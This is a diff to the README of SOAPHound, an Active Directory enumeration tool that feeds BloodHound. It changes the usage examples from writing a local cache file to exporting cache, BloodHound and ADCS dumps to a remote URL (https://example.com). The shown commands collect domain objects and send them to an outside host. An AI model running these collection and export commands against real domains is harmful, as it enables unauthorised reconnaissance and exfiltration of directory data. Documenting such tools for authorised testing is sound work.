@@ -32,7 +32,7 @@ Supported collection methods:
 
 Output options:
   -u, --exporturl          URL to export outputs to 
-  -c, --cachefilename      Filename for the cache file (full path needed)
+  -i, --cacheid            Cache ID to use during dumps
 
 Splitting options:
   -a, --autosplit          (Default: false) Enable AutoSplit mode: automatically split object retrieval on two depth levels based on defined trheshold
@@ -79,14 +79,25 @@ This cache file is required for BloodHound related data collection (i.e. the `--
 An example command to build the cache file is:
 
 ```
-SOAPHound.exe --buildcache -c c:\temp\cache.txt
+SOAPHound.exe --buildcache --exporturl https://example.com
 ```
 
-This will generate a cache file in the `c:\temp` folder. The cache file is a JSON formatted mapping of basic information about all domain objects.
+This will export the cache to the remote server and present you with a `cache id` which can be used in subsequent calls while dumping domain artefacts. Example output:
+
+```
+Z:\>SOAPHound.exe --buildcache  --exporturl https://example.com
+-------------
+Generating cache
+ADWS request with ldapbase (DC=BRUCE,DC=local), ldapquery: (!soaphound=*) and ldapproperties: [objectSid, objectGUID, distinguishedName]
+Generating cache complete
+Exported cache to: https://example.com/cache?id=6X1s19lM07uh6G1mFZXDp21rzay97u5G
+CACHE ID: 6X1s19lM07uh6G1mFZXDp21rzay97u5G
+```
+
 To view some statistics about the cache file (i.e. number of domain objects starting with each letter), you can use the `--showstats` command line argument:
 
 ```
-SOAPHound.exe --showstats -c c:\temp\cache.txt
+SOAPHound.exe --showstats  --exporturl https://example.com --cacheid CACHE-ID
 ```
 
 ## Collecting BloodHound Data
@@ -96,7 +107,7 @@ After the cache file has been generated, you can use the `--bhdump` collection m
 An example command to collect BloodHound data is (note that this references the cache file generated in the previous step):
 
 ```
-SOAPHound.exe -c c:\temp\cache.txt --bhdump --exporturl https://example.com
+SOAPHound.exe --cacheid CACHE-ID --bhdump --exporturl https://example.com
 ```
 
 If the targeted domain does not use LAPS, you can use the `--nolaps` command line argument to skip the LAPS related data collection. 
@@ -115,7 +126,7 @@ The `--threshold` command line argument defines the split threshold based on the
 An example command to collect BloodHound data in AutoSplit mode is:
 
 ```
-SOAPHound.exe -c c:\temp\cache.txt --bhdump --exporturl https://example.com --autosplit --threshold 1000
+SOAPHound.exe --cacheid CACHE-ID --bhdump --exporturl https://example.com --autosplit --threshold 1000
 ```
 
 This will generate the output in batches of a maximum of 1000 objects per starting letter. 
@@ -133,7 +144,7 @@ This collection method does not support the `--autosplit` and `--threshold` comm
 An example command to collect ADCS data is (note that this references the cache file generated in previous step):
 
 ```
-SOAPHound.exe -c c:\temp\cache.txt --certdump --exporturl https://example.com
+SOAPHound.exe --cacheid CACHE-ID --certdump --exporturl https://example.com
 ```
 
 This command will produce two JSON files that can be imported into BloodHound, containing information about the Certificate Authorities (CA) and Certificate Templates and export it to `https://example.com` . SOAPHound is compatible with Bloodhound version 4 and ADCS data are classified as GPO objects in Bloodhound.
